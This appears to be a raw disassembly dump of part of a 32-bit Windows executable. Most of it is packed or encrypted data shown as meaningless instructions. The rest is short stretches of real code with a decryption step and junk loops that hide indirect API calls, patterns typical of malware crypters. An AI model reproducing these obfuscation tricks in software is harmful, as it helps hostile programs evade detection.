  40633e:	adc    bh,cl
  406340:	sub    eax,0x5b1047c2
  406345:	aas    
  406346:	pop    ds
  406347:	in     al,dx
  406348:	jns    0x406340
  40634a:	pop    es
  40634b:	or     BYTE PTR [edx+eax*8+0x70447655],0x51
  406353:	add    DWORD PTR [edx-0x2a02f8c4],edi
  406359:	cwde   
  40635a:	mov    dh,0xaf
  40635c:	repz jmp 0xb0ca:0x83587408
  406364:	inc    edi
  406365:	jecxz  0x406352
  406367:	lock pop edi
  406369:	cmc    
  40636a:	xchg   ecx,eax
  40636b:	nop
  40636c:	(bad)  
  40636d:	mov    al,ds:0xae6a27fd
  406372:	pop    esi
  406373:	pop    ds
  406374:	mov    eax,0xa22ba570
  406379:	ja     0x406392
  40637b:	bound  ecx,QWORD PTR [esp+esi*4+0x5550c8ce]
  406382:	data16 adc bl,BYTE PTR [ecx-0xe999542]
  406389:	call   0x80d1:0xc363d5ff
  406390:	jecxz  0x40631b
  406392:	inc    esi
  406393:	sbb    eax,0x195652d5
  406398:	sub    al,0x17
  40639a:	sub    DWORD PTR ss:[ebx+0x40],esp
  40639e:	cld    
  40639f:	fsubr  QWORD PTR [eax]
  4063a1:	dec    eax
  4063a2:	jmp    0x2d7bfcfb
  4063a7:	into   
  4063a8:	enter  0xeda,0x35
  4063ac:	fs sub eax,eax
  4063af:	fdivr  st,st(0)
  4063b1:	cmp    ecx,ebx
  4063b3:	adc    BYTE PTR [ebp+ebx*4-0xe],bh
  4063b7:	fdiv   st(7),st
  4063b9:	jne    0x4063af
  4063bb:	push   DWORD PTR [ebp-0x14]
  4063be:	jmp    0x4065b6
  4063c3:	push   edi
  4063c4:	mov    bh,BYTE PTR [esi+0x51514381]
  4063ca:	dec    eax
  4063cb:	sub    DWORD PTR [eax],eax
  4063cd:	enter  0x49e0,0x83
  4063d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063d2:	lahf   
  4063d3:	aam    0x31
  4063d5:	jle    0x406455
  4063d7:	push   ebp
  4063d8:	jg     0x406458
  4063da:	jle    0x406410
  4063dc:	pusha  
  4063dd:	dec    esp
  4063de:	js     0x406453
  4063e0:	in     al,dx
  4063e1:	inc    esi
  4063e2:	rol    BYTE PTR [ecx+0x5b32c294],0x4e
  4063e9:	mov    esp,0x400db509
  4063ee:	inc    esp
  4063ef:	mov    ebp,0xd913fdeb
  4063f4:	pushf  
  4063f5:	cli    
  4063f6:	int    0x2c
  4063f8:	push   ss
  4063f9:	pop    edi
  4063fa:	and    ch,BYTE PTR ds:0xd0bbc4e8
  406400:	push   es
  406401:	push   edi
  406402:	jmp    DWORD PTR es:[eax-0x26]
  406406:	stos   DWORD PTR es:[edi],eax
  406407:	xchg   ebx,eax
  406408:	das    
  406409:	push   ss
  40640a:	sbb    ah,BYTE PTR [ecx-0x2e6e0a6d]
  406410:	mov    ss,WORD PTR [ebp+0x6b281b27]
  406416:	add    cl,BYTE PTR [eax+0x44]
  406419:	jbe    0x406440
  40641b:	cmp    al,0xc5
  40641d:	push   edx
  40641e:	sbb    eax,0x2
  406421:	push   edx
  406422:	cmpxchg BYTE PTR [ecx-0x44],bh
  406426:	out    dx,eax
  406427:	xchg   edx,eax
  406428:	leave  
  406429:	cmp    ch,BYTE PTR [esi+0x1a95cca4]
  40642f:	fisub  WORD PTR [ecx-0x30]
  406432:	aam    0xb8
  406434:	jge    0x40644f
  406436:	sti    
  406437:	inc    esp
  406438:	dec    edi
  406439:	call   0xc2bd:0xfeb677ab
  406440:	sbb    DWORD PTR [ebx+0x5e],ebx
  406443:	jae    0x406400
  406445:	ins    DWORD PTR es:[edi],dx
  406446:	jmp    FWORD PTR [ecx-0x7c]
  406449:	mov    eax,ds:0xf12afa38
  40644e:	out    0x4d,al
  406450:	mov    cl,0x68
  406452:	das    
  406453:	dec    ecx
  406454:	int    0x78
  406456:	sbb    DWORD PTR [ecx+0x73e0b3b5],eax
  40645c:	mov    BYTE PTR [edi+eax*4-0x6a],al
  406460:	adc    eax,esp
  406462:	sub    esp,DWORD PTR [ecx-0xf46da45]
  406468:	inc    ebx
  406469:	fxtract 
  40646b:	mov    eax,0x9f796057
  406470:	pushf  
  406471:	aam    0xbc
  406473:	into   
  406474:	(bad)  [eax]
  406476:	push   ebx
  406477:	jno    0x406424
  406479:	xchg   ebp,eax
  40647a:	outs   dx,DWORD PTR ds:[esi]
  40647b:	lods   eax,DWORD PTR ds:[esi]
  40647c:	sub    al,0xa4
  40647e:	(bad)  
  40647f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406480:	not    DWORD PTR [ebp+esi*1-0xe]
  406484:	mov    esi,0x637ede63
  406489:	jbe    0x40645f
  40648b:	and    al,BYTE PTR [esi+edi*8-0x6]
  40648f:	push   ecx
  406490:	test   BYTE PTR [ebx+0x5efcfc3c],bl
  406496:	mov    es,WORD PTR gs:[ebp+0x46]
  40649a:	es pop edi
  40649c:	pop    edx
  40649d:	jmp    0xd115:0xad472e00
  4064a4:	mov    eax,ds:0xa868285
  4064a9:	push   0x58a98255
  4064ae:	dec    edx
  4064af:	or     dh,dh
  4064b1:	div    BYTE PTR [edi+0x7e]
  4064b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064b5:	push   bx
  4064b7:	shr    BYTE PTR [edi-0x7c],0x83
  4064bb:	cli    
  4064bc:	cmp    BYTE PTR [edx+0x3b],ch
  4064bf:	jmp    0xac5b40ec
  4064c4:	or     esi,DWORD PTR [eax+edx*4-0x16]
  4064c8:	mov    ds:0x5c6aee6b,al
  4064cd:	mov    eax,0xc1382546
  4064d3:	mov    bh,0x1f
  4064d5:	in     eax,0xcd
  4064d7:	sbb    al,0xb9
  4064d9:	sub    eax,0xbf3e30f3
  4064de:	imul   ebp,DWORD PTR ds:0xa4aa5ff,0x871856d1
  4064e8:	sub    esp,DWORD PTR [edx+0x24b48cf5]
  4064ee:	inc    ebp
  4064ef:	das    
  4064f0:	mov    ds:0xb934a06e,eax
  4064f5:	jecxz  0x4064ae
  4064f7:	adc    BYTE PTR [edx],ah
  4064f9:	rol    DWORD PTR [edi-0x1721a919],1
  4064ff:	mov    fs,ebx
  406501:	ds sbb eax,0x39f2a8f3
  406507:	div    BYTE PTR [esp+ebp*1]
  40650a:	ss adc eax,0xe7809ca5
  406510:	fwait
  406511:	adc    BYTE PTR [ecx-0x40745203],0xc5
  406518:	sbb    al,0xb3
  40651a:	and    bl,BYTE PTR [esi]
  40651c:	lds    edx,FWORD PTR [ebx-0xcd80409]
  406522:	jmp    0x40650c
  406524:	inc    edx
  406525:	scas   eax,DWORD PTR es:[edi]
  406526:	pop    ds
  406527:	and    al,0x11
  406529:	mov    cl,0x9f
  40652b:	or     DWORD PTR [ebp-0x61d5beb8],edi
  406531:	xchg   esp,eax
  406532:	push   ebx
  406533:	popa   
  406534:	and    bl,BYTE PTR [ecx-0x7e65e012]
  40653a:	mov    ebx,0x25893f60
  40653f:	push   ss
  406540:	xor    DWORD PTR [edi],esp
  406542:	les    ecx,FWORD PTR [edi+edx*8-0xcd6a6fa]
  406549:	outs   dx,BYTE PTR ds:[esi]
  40654a:	xchg   esp,eax
  40654b:	sbb    eax,0x1dc8ad6f
  406550:	out    0xbe,eax
  406552:	femms  
  406554:	xchg   DWORD PTR [edi+ecx*4-0x26],edi
  406558:	dec    ecx
  406559:	lds    eax,FWORD PTR [ebp+0x49]
  40655c:	and    al,0x53
  40655e:	pop    edx
  40655f:	rol    BYTE PTR [edi-0x103f640e],1
  406565:	adc    DWORD PTR [edx-0x36941c26],ecx
  40656b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40656c:	stos   BYTE PTR es:[edi],al
  40656d:	jbe    0x4065e2
  40656f:	je     0x4065eb
  406571:	inc    esi
  406572:	in     al,0xed
  406574:	push   ebp
  406575:	pop    edi
  406576:	and    BYTE PTR [edx-0x7e2c1f92],al
  40657c:	(bad)  
  40657d:	push   ebp
  40657e:	fcmove st,st(0)
  406580:	loopne 0x40654f
  406582:	jae    0x40657f
  406584:	shr    edx,1
  406586:	js     0x406528
  406588:	mov    esi,DWORD PTR [edi+edx*4-0x54]
  40658c:	xchg   edi,eax
  40658d:	es dec ebp
  40658f:	mov    BYTE PTR [eax+0x73],bh
  406592:	add    al,BYTE PTR [esi-0x9b84dad]
  406598:	and    DWORD PTR [esi],eax
  40659a:	fisub  WORD PTR [ebp+0x6be2ef88]
  4065a0:	adc    al,0xe9
  4065a2:	mov    bh,0x95
  4065a4:	xchg   BYTE PTR [eax+0x56e7eaa8],bh
  4065aa:	mov    bh,0x2b
  4065ac:	out    0xb6,eax
  4065ae:	dec    edi
  4065af:	sti    
  4065b0:	sub    BYTE PTR [ecx+0x98501b9],0xe8
  4065b7:	mov    fs,edi
  4065b9:	(bad)  
  4065ba:	inc    DWORD PTR [ebp+0x25840fc0]
  4065c0:	add    BYTE PTR [eax],al
  4065c2:	add    BYTE PTR [ebp-0x74af77bb],cl
  4065c8:	inc    ebp
  4065c9:	in     al,dx
  4065ca:	xor    eax,esi
  4065cc:	add    eax,edi
  4065ce:	push   eax
  4065cf:	mov    eax,DWORD PTR [ebp-0x10]
  4065d2:	add    eax,0xee
  4065d7:	push   eax
  4065d8:	mov    eax,DWORD PTR [ebp-0x10]
  4065db:	mov    eax,DWORD PTR [eax+0x198]
  4065e1:	push   DWORD PTR [eax]
  4065e3:	call   0x40cdc5
  4065e8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4065eb:	xor    ecx,esi
  4065ed:	jmp    0x4067e5
  4065f2:	fwait
  4065f3:	imul   edx,eax,0x42
  4065f6:	shl    BYTE PTR [ecx-0x57],1
  4065f9:	jae    0x406585
  4065fb:	sbb    edi,DWORD PTR [edx+edx*1-0x8a943ae]
  406602:	sub    edi,DWORD PTR [edi]
  406604:	jle    0x406684
  406606:	push   ebp
  406607:	jg     0x406687
  406609:	jle    0x406637
  40660b:	aas    
  40660c:	sub    dh,BYTE PTR [eax-0x38]
  40660f:	jns    0x40664e
  406611:	xchg   DWORD PTR [edx],edx
  406613:	data16 mov ch,0x58
  406616:	push   esp
  406617:	jno    0x406696
  406619:	idiv   BYTE PTR [esi+eax*4+0x289f7960]
  406620:	imul   ebx,edi,0xd6174c16
  406626:	faddp  st(2),st
  406628:	pop    esi
  406629:	out    dx,al
  40662a:	or     eax,0x9c930f8b
  40662f:	aaa    
  406630:	imul   eax,ebp,0x6a
  406633:	mov    ?,eax
  406635:	std    
  406636:	add    BYTE PTR [eax-0x676ce1c9],ah
  40663c:	loop   0x40669f
  40663e:	push   ds
  40663f:	xchg   ebx,eax
  406640:	fwait
  406641:	leave  
  406642:	sbb    al,0xf8
  406644:	or     BYTE PTR [eax+0x24],dh
  406647:	pop    esp
  406648:	mov    bl,0x7b
  40664a:	je     0x40662f
  40664c:	pop    ss
  40664d:	pusha  
  40664e:	ja     0x406607
  406650:	cmp    edi,0x49e47d72
  406656:	lea    edx,[esi+0xf828735]
  40665c:	mov    ds:0x99b349d0,eax
  406661:	mov    BYTE PTR [eax],ah
  406663:	loope  0x406615
  406665:	shr    BYTE PTR [ecx],cl
  406667:	xchg   edx,eax
  406668:	sar    BYTE PTR [ebp+0x3b4c1354],0xce
  40666f:	push   edi
  406670:	and    al,0xba
  406672:	xchg   DWORD PTR [ebx-0xc],esi
  406675:	adc    edx,ecx
  406677:	mov    bl,0x5e
  406679:	push   cs
  40667a:	jne    0x406623
  40667c:	repz aad 0x34
  40667f:	pop    ebp
  406680:	adc    esi,ecx
  406682:	push   edi
  406683:	leave  
  406684:	cmc    
  406685:	out    0x5,eax
  406687:	jl     0x406666
  406689:	lea    eax,[eax+0x5c]
  40668c:	jae    0x40668c
  40668e:	mov    ds:0x1377293d,al
  406693:	sbb    ebx,edx
  406695:	fisub  DWORD PTR [ebx]
  406697:	mov    ds:0x497e2d8a,al
  40669c:	jecxz  0x40665c
  40669e:	inc    ebp
  40669f:	sbb    BYTE PTR [esi+ebp*2-0x35773a4e],ah
  4066a6:	push   edx
  4066a7:	xor    edx,ebx
  4066a9:	sbb    al,0xd8
  4066ab:	sub    DWORD PTR [esi],ecx
  4066ad:	(bad)  
  4066ae:	shl    ecx,1
  4066b0:	hlt    
  4066b1:	sar    cl,cl
  4066b3:	xchg   ebx,eax
  4066b4:	mov    bl,0xf3
  4066b6:	out    dx,al
  4066b7:	dec    esi
  4066b8:	inc    eax
  4066b9:	mov    WORD PTR [ebx-0x2bad0792],gs
  4066bf:	mov    eax,DWORD PTR [eax]
  4066c1:	or     eax,0xc0fb1ce5
  4066c6:	push   ebx
  4066c7:	daa    
  4066c8:	xor    ch,ch
  4066ca:	icebp  
  4066cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066cc:	js     0x406670
  4066ce:	call   0x5af9:0x9ca16ac2
  4066d5:	lahf   
  4066d6:	mov    DWORD PTR [edx],ebp
  4066d8:	lock and BYTE PTR [edx+0x10],ch
  4066dc:	sub    eax,0x7349bca7
  4066e1:	or     al,0x34
  4066e3:	sbb    ah,ah
  4066e5:	jp     0x406682
  4066e7:	sbb    ecx,DWORD PTR [edx+0x13]
  4066ea:	leave  
  4066eb:	std    
  4066ec:	out    0x64,al
  4066ee:	addr16 mov ds:0x3573,eax
  4066f3:	xchg   ecx,eax
  4066f4:	sbb    al,0x6e
  4066f6:	fwait
  4066f7:	mov    bh,bl
  4066f9:	sub    ecx,ecx
  4066fb:	add    bh,dh
  4066fd:	xor    BYTE PTR [esi-0x60be96ac],bl
  406703:	pop    edi
  406704:	sbb    ebx,DWORD PTR [edi+0x6a]
  406707:	lea    esp,[eax-0x4a]
  40670a:	into   
  40670b:	and    eax,0xf1e04231
  406710:	mov    bl,0x66
  406712:	pusha  
  406713:	ror    DWORD PTR [edi+0x3994387a],0xa5
  40671a:	jo     0x40672a
  40671c:	pushf  
  40671d:	and    DWORD PTR [eax-0x40f67eac],edi
  406723:	scas   al,BYTE PTR es:[edi]
  406724:	fwait
  406725:	adc    eax,0xda546cc5
  40672a:	fcomp  st(1)
  40672c:	pop    ds
  40672d:	fcomip st,st(0)
  40672f:	cld    
  406730:	fdivr  QWORD PTR [ebx-0x5f]
  406733:	retf   0x2bea
  406736:	test   eax,0xe010dd84
  40673b:	sbb    al,0x9c
  40673d:	push   edi
  40673e:	test   BYTE PTR [ebx+0x675c201f],0x3a
  406745:	jne    0x40671b
  406747:	mov    ah,0x75
  406749:	jne    0x40673b
  40674b:	ins    BYTE PTR es:[edi],dx
  40674c:	in     eax,dx
  40674d:	(bad)  
  40674e:	repnz shl DWORD PTR [esi+0x4b],cl
  406752:	lahf   
  406753:	push   0xffffffd1
  406755:	dec    ebx
  406756:	mov    ch,BYTE PTR [ebx]
  406758:	add    cl,BYTE PTR [ebp+0x5ecc5f5d]
  40675e:	xor    al,0xd5
  406760:	mov    edx,0x720d80e5
  406765:	inc    edi
  406766:	je     0x4067b6
  406768:	xchg   BYTE PTR [eax+eiz*8-0x3a],dh
  40676c:	dec    ebx
  40676d:	movsx  edx,BYTE PTR [ecx]
  406770:	std    
  406771:	int3   
  406772:	neg    DWORD PTR [ebp-0x23]
  406775:	enter  0xdaaf,0x19
  406779:	pop    ds
  40677a:	aaa    
  40677b:	loopne 0x406771
  40677d:	mov    cl,0xc7
  40677f:	clc    
  406780:	dec    eax
  406781:	stos   BYTE PTR es:[edi],al
  406782:	xor    eax,0xde3d5b4b
  406787:	ja     0x40674c
  406789:	jnp    0x40674f
  40678b:	adc    BYTE PTR [edi],ah
  40678d:	(bad)  
  40678e:	sbb    esi,DWORD PTR [eax-0x19]
  406791:	add    eax,0x7b0aaffa
  406796:	push   edi
  406797:	fistp  DWORD PTR [esi]
  406799:	mov    edi,0x96acea8d
  40679e:	push   cs
  40679f:	into   
  4067a0:	ret    
  4067a1:	icebp  
  4067a2:	jns    0x40678a
  4067a4:	add    eax,0x8a0fc989
  4067a9:	mov    edi,0x3b3e06f5
  4067ae:	in     eax,0xad
  4067b0:	or     eax,0x78b82ab8
  4067b5:	xlat   BYTE PTR ds:[ebx]
  4067b6:	(bad)  
  4067b8:	mov    ds,esp
  4067ba:	xchg   esi,eax
  4067bb:	add    BYTE PTR [edi],0xfe
  4067be:	pop    es
  4067bf:	aad    0x35
  4067c1:	sub    al,0xac
  4067c3:	xchg   edi,eax
  4067c4:	push   edx
  4067c5:	sub    DWORD PTR [ecx-0x31],edx
  4067c8:	scas   al,BYTE PTR es:[edi]
  4067c9:	xor    ecx,DWORD PTR [esi+0x5d696444]
  4067cf:	sbb    eax,0xd480f9c4
  4067d4:	push   es
  4067d5:	(bad)  
  4067d6:	push   ss
  4067d7:	push   ebx
  4067d8:	pop    ecx
  4067d9:	add    al,0x5e
  4067db:	daa    
  4067dc:	mov    eax,DWORD PTR [edi]
  4067de:	sub    eax,0x83a398cb
  4067e3:	loope  0x4067cd
  4067e5:	mov    eax,0xffcd8d65
  4067ea:	sub    eax,ecx
  4067ec:	sub    eax,DWORD PTR [ebp-0x8]
  4067ef:	mov    ecx,DWORD PTR [ebp-0x30]
  4067f2:	add    ecx,eax
  4067f4:	mov    eax,DWORD PTR [ebp-0x8]
  4067f7:	mov    DWORD PTR [eax+0x1],ecx
  4067fa:	mov    al,BYTE PTR [ebp-0x1]
  4067fd:	mov    ecx,DWORD PTR [ebp-0x8]
  406800:	xor    al,0x46
  406802:	sub    al,0x38
  406804:	mov    BYTE PTR [ecx],al
  406806:	lea    eax,[ebp-0x8]
  406809:	inc    BYTE PTR [eax]
  40680b:	inc    eax
  40680c:	push   eax
  40680d:	pop    ecx
  40680e:	dec    ecx
  40680f:	xchg   ecx,edx
  406811:	dec    BYTE PTR [edx]
  406813:	push   DWORD PTR [ebp-0x10]
  406816:	mov    eax,ds:0x412264
  40681b:	mov    eax,DWORD PTR [eax]
  40681d:	push   DWORD PTR [eax]
  40681f:	lea    eax,ds:0x412280
  406825:	push   DWORD PTR [eax]
  406827:	lea    eax,ds:0x41202c
  40682d:	push   DWORD PTR [eax]
  40682f:	lea    eax,ds:0x412260
  406835:	push   DWORD PTR [eax]
  406837:	lea    eax,ds:0x4122f4
  40683d:	push   DWORD PTR [eax]
  40683f:	xchg   ebx,edx
  406841:	inc    ebx
  406842:	inc    ebx
  406843:	sub    ebx,0x3
  406846:	push   ebx
  406847:	jmp    0x406a3f
  40684c:	xchg   edx,eax
  40684d:	lods   al,BYTE PTR ds:[esi]
  40684e:	sbb    eax,0x91ab211a
  406853:	mov    ah,0x54
  406855:	jmp    0x4da2:0xfc1df6f1
  40685c:	push   cs
  40685d:	cmp    eax,0x7f557e7e
  406862:	jle    0x4068e2
  406864:	dec    edx
  406865:	xchg   ecx,eax
  406866:	inc    ebp
  406867:	mov    bl,0x8d
  406869:	xor    bh,BYTE PTR [ebx]
  40686b:	mov    esi,0xbeddc08a
  406870:	(bad)  
  406871:	pop    edx
  406872:	xlat   BYTE PTR ds:[ebx]
  406873:	ins    BYTE PTR es:[edi],dx
  406874:	xchg   BYTE PTR [edi],dh
  406876:	sti    
  406877:	cld    
  406878:	ins    BYTE PTR es:[edi],dx
  406879:	mov    cs,WORD PTR [edi]
  40687b:	and    bl,BYTE PTR [eax]
  40687d:	(bad)  
  40687e:	shl    dl,1
  406880:	inc    esi
  406881:	inc    ebx
  406882:	jg     0x40685b
  406884:	sar    DWORD PTR [ebx+ecx*4-0x19c71699],0x70
  40688c:	push   es
  40688d:	(bad)  
  40688e:	xchg   ebx,eax
  40688f:	ret    
  406890:	mov    ebx,0xa95f6eea
  406895:	jp     0x40687d
  406897:	std    
  406898:	add    cl,BYTE PTR [eax+0x7921227b]
  40689e:	mov    bh,0x6a
  4068a0:	inc    ebx
  4068a1:	mov    esi,0x3e016123
  4068a6:	cs dec eax
  4068a8:	stos   DWORD PTR es:[edi],eax
  4068a9:	jle    0x406891
  4068ab:	inc    DWORD PTR [edi+0x5a75cce2]
  4068b1:	mov    ecx,0xa1f0c57c
  4068b6:	jge    0x406873
  4068b8:	cld    
  4068b9:	out    dx,al
  4068ba:	adc    al,0x21
  4068bc:	in     al,dx
  4068bd:	outs   dx,DWORD PTR ds:[esi]
  4068be:	inc    ebx
  4068bf:	std    
  4068c0:	jge    0x406936
  4068c2:	pop    ebx
  4068c3:	jb     0x406867
  4068c5:	jns    0x406906
  4068c7:	fsubr  QWORD PTR [edi]
  4068c9:	in     al,0x2b
  4068cb:	sahf   
  4068cc:	mov    ecx,0x9743731e
  4068d1:	lods   eax,DWORD PTR ds:[esi]
  4068d2:	cld    
  4068d3:	push   ds
  4068d4:	shl    DWORD PTR ds:0xc50832d9,cl
  4068da:	sub    DWORD PTR [eax+0x26a63e0a],ebx
  4068e0:	out    0x77,al
  4068e2:	jl     0x406958
  4068e4:	stos   BYTE PTR es:[edi],al
  4068e5:	shr    DWORD PTR [esi+0x6026a04f],0xb
  4068ec:	mov    ebp,0xf7424a1e
  4068f1:	mov    dl,0x23
  4068f3:	sub    al,0xe0
  4068f5:	or     eax,0xb18235b2
  4068fa:	inc    edx
  4068fb:	inc    edx
  4068fc:	mov    al,0x4d
  4068fe:	push   esi
  4068ff:	aad    0xce
  406901:	lods   al,BYTE PTR cs:[esi]
  406903:	iret   
  406904:	ins    DWORD PTR es:[edi],dx
  406905:	mov    ds:0xcb96ae36,al
  40690a:	mov    al,ds:0x3fc1b9d6
  40690f:	or     dl,dh
  406911:	aad    0xcf
  406913:	loopne 0x406924
  406915:	lods   eax,DWORD PTR ds:[esi]
  406916:	xchg   esp,eax
  406917:	fwait
  406918:	ins    DWORD PTR es:[edi],dx
  406919:	inc    eax
  40691a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40691b:	fcmovb st,st(1)
  40691d:	out    0xb3,al
  40691f:	lock xor bh,BYTE PTR [ebp+0x4f5aeae2]
  406926:	dec    ebp
  406927:	sub    eax,0x172b1398
  40692c:	mov    ecx,0xa74cbb97
  406931:	shl    eax,0x52
  406934:	mov    WORD PTR [eax],gs
  406936:	fild   WORD PTR [eax-0x693b1a3c]
  40693c:	cmp    eax,0xc708657d
  406941:	sahf   
  406942:	cmp    eax,0x72d8af52
  406947:	sub    eax,ecx
  406949:	mov    al,ds:0x26f49273
  40694e:	or     cl,al
  406950:	das    
  406951:	aaa    
  406952:	dec    esi
  406953:	add    al,cl
  406955:	ret    
  406956:	shl    BYTE PTR [ebx+eiz*1+0x535aecd4],0x7a
  40695e:	add    al,0xdf
  406960:	fldenv [ebp+0x30bee514]
  406966:	xchg   DWORD PTR [edi-0x72],ebp
  406969:	test   eax,0xa3aa0641
  40696e:	jae    0x406939
  406970:	test   al,0x40
  406973:	sbb    eax,ecx
  406975:	gs cs in eax,0xdd
  406979:	in     al,0x9f
  40697b:	mov    dh,0xa
  40697d:	(bad)  
  40697e:	adc    eax,0x39ea8712
  406983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406984:	loop   0x406939
  406986:	repnz mov dl,0x44
  406989:	dec    ebx
  40698a:	in     eax,0xb3
  40698c:	add    ebp,edx
  40698e:	or     BYTE PTR [edx+esi*2],0xd2
  406992:	daa    
  406993:	jb     0x4069d8
  406995:	sub    BYTE PTR [ecx+0x36],0xeb
  406999:	adc    ch,BYTE PTR [esp+edi*2]
  40699c:	push   esi
  40699d:	pop    es
  40699e:	and    eax,0xca484a84
  4069a3:	test   DWORD PTR [ecx+eiz*8-0x3905532],edi
  4069aa:	sbb    ebp,edx
  4069ac:	repz or eax,0x1036ad2d
  4069b2:	pop    esi
  4069b3:	retf   0xa7e
  4069b6:	dec    ebp
  4069b7:	ficomp DWORD PTR [edi]
  4069b9:	dec    edi
  4069ba:	loope  0x4069c0
  4069bc:	mov    bl,0x4a
  4069be:	push   ebx
  4069bf:	fwait
  4069c0:	call   0x7440f0ab
  4069c5:	push   esi
  4069c6:	adc    edx,DWORD PTR [ebx+0x43]
  4069c9:	pop    esi
  4069ca:	or     edx,edi
  4069cc:	adc    al,0xa2
  4069ce:	cmp    BYTE PTR [eax],al
  4069d0:	call   DWORD PTR [ecx]
  4069d2:	add    al,0x98
  4069d4:	inc    edi
  4069d5:	pop    edx
  4069d6:	or     esp,edi
  4069d8:	adc    al,0x7
  4069da:	mov    esi,edi
  4069dc:	cld    
  4069dd:	(bad)
  4069e1:	or     BYTE PTR [eax-0x1879168b],dh
  4069e7:	jne    0x406a67
  4069e9:	les    esi,FWORD PTR [ebx]
  4069eb:	mov    dl,0x5
  4069ed:	dec    esp
  4069ee:	sti    
  4069ef:	fucomip st,st(3)
  4069f1:	push   edi
  4069f2:	div    DWORD PTR [edi+ecx*2-0x37a51c7f]
  4069f9:	sbb    eax,0xd984cbfd
  4069fe:	inc    ebp
  4069ff:	pop    ds
  406a00:	repz lds edx,FWORD PTR [ecx+0x40d6cef8]
  406a07:	mov    cl,0xf5
  406a09:	mov    ecx,DWORD PTR [esi+0x58]
  406a0c:	jae    0x406a74
  406a0e:	xor    DWORD PTR [ebx+0x8],ebp
  406a11:	inc    esi
  406a12:	fistp  QWORD PTR [ebx]
  406a14:	xchg   edx,eax
  406a15:	adc    ecx,esp
  406a17:	mov    BYTE PTR [esi],al
  406a19:	add    al,0x3
  406a1b:	loope  0x406a2f
  406a1d:	sub    al,0xff
  406a1f:	dec    esi
  406a20:	out    0x5,eax
  406a22:	enter  0x2bc1,0xd3
  406a26:	ja     0x406a9b
  406a28:	push   esp
  406a29:	pushf  
  406a2a:	jns    0x406a9a
  406a2c:	or     eax,0x46a6fa62
  406a31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a32:	aad    0xfe
  406a34:	add    BYTE PTR [eax],dl
  406a36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a37:	and    ecx,edx
  406a39:	adc    eax,0x7117edfb
  406a3e:	jg     0x406a98
  406a40:	call   DWORD PTR [eax+0x1]
  406a43:	mov    eax,DWORD PTR [ebp-0x20]
  406a46:	mov    ecx,DWORD PTR ds:0x412224
  406a4c:	add    DWORD PTR [eax],ecx
  406a4e:	pop    edi
  406a4f:	pop    esi
  406a50:	pop    ebx
  406a51:	leave  
  406a52:	ret    
  406a53:	push   ebp
  406a54:	mov    ebp,esp
  406a56:	sub    esp,0x44
  406a59:	push   edi
  406a5a:	mov    DWORD PTR ds:0x42ede3,0x1a
  406a64:	cmp    DWORD PTR ds:0x42ede3,0x0
  406a6b:	je     0x406ab1
  406a71:	cmp    DWORD PTR ds:0x42ede3,0x25
  406a78:	jne    0x406a8a
  406a7e:	push   DWORD PTR [ebp-0x1c]
  406a81:	push   DWORD PTR [ebp-0x20]
  406a84:	call   DWORD PTR ds:0x42ec1b
  406a8a:	xor    edi,edi
  406a8c:	add    edi,DWORD PTR ds:0x42ede3
  406a92:	dec    edi
  406a93:	mov    DWORD PTR ds:0x42ede3,edi
  406a99:	jmp    0x406a64
  406a9e:	movzx  edi,BYTE PTR ds:0x4304e7
  406aa5:	xor    edi,DWORD PTR ds:0x430435
  406aab:	mov    DWORD PTR ds:0x4304e7,edi
  406ab1:	mov    eax,DWORD PTR [ebp+0xc]
  406ab4:	and    edx,edi
  406ab6:	mov    DWORD PTR [ebp-0x10],eax
  406ab9:	mov    eax,DWORD PTR [ebp+0x8]
  406abc:	and    DWORD PTR ds:0x43045d,0x0
  406ac6:	mov    ecx,DWORD PTR ds:0x43045d
  406acc:	inc    ecx
  406acd:	mov    DWORD PTR ds:0x43045d,ecx
  406ad3:	cmp    DWORD PTR ds:0x43045d,0x23
  406ada:	jne    0x406af9
  406ae0:	push   0x42e8b7
  406ae5:	push   DWORD PTR [ebp-0x28]
  406ae8:	push   DWORD PTR [ebp-0x28]
  406aeb:	push   0x2078
  406af0:	push   DWORD PTR [ebp-0x10]
  406af3:	call   DWORD PTR ds:0x42ec1f
  406af9:	cmp    DWORD PTR ds:0x43045d,0x1c
  406b00:	jb     0x406ac6
  406b06:	or     edi,0x11f2
  406b0c:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  406b13:	mov    DWORD PTR ds:0x4304df,0x15
  406b1d:	cmp    DWORD PTR ds:0x4304df,0x0
  406b24:	je     0x406b57
  406b2a:	cmp    DWORD PTR ds:0x4304df,0x16
  406b31:	jne    0x406b3d
  406b37:	call   DWORD PTR ds:0x42e9df
  406b3d:	xor    ecx,ecx
  406b3f:	xor    ecx,DWORD PTR ds:0x4304df
  406b45:	dec    ecx
  406b46:	mov    DWORD PTR ds:0x4304df,ecx
  406b4c:	jmp    0x406b1d
  406b51:	sub    DWORD PTR ds:0x430435,ebx
  406b57:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  406b5e:	mov    edx,DWORD PTR [ebp+0x8]
  406b61:	sbb    edi,edi
  406b63:	mov    DWORD PTR [ebp-0x40],eax
  406b66:	mov    eax,0x7510854
  406b6b:	and    DWORD PTR ds:0x4304d7,0x0
  406b75:	jmp    0x406b87
  406b7a:	mov    ecx,DWORD PTR ds:0x4304d7
  406b80:	inc    ecx
  406b81:	mov    DWORD PTR ds:0x4304d7,ecx
  406b87:	cmp    DWORD PTR ds:0x4304d7,0x11
  406b8e:	jae    0x406bc3
  406b94:	cmp    DWORD PTR ds:0x4304d7,0x1e
  406b9b:	jne    0x406bbe
  406ba1:	push   DWORD PTR [ebp-0x1c]
  406ba4:	push   0x42e7e6
  406ba9:	push   0x798e
  406bae:	push   0x8b33
  406bb3:	push   0x403f
  406bb8:	call   DWORD PTR ds:0x42eaa7
  406bbe:	jmp    0x406b7a
  406bc3:	xor    edx,eax
  406bc5:	xor    ecx,ecx
  406bc7:	xor    ecx,DWORD PTR ds:0x42e7c8
  406bcd:	add    DWORD PTR ds:0x43043d,ecx
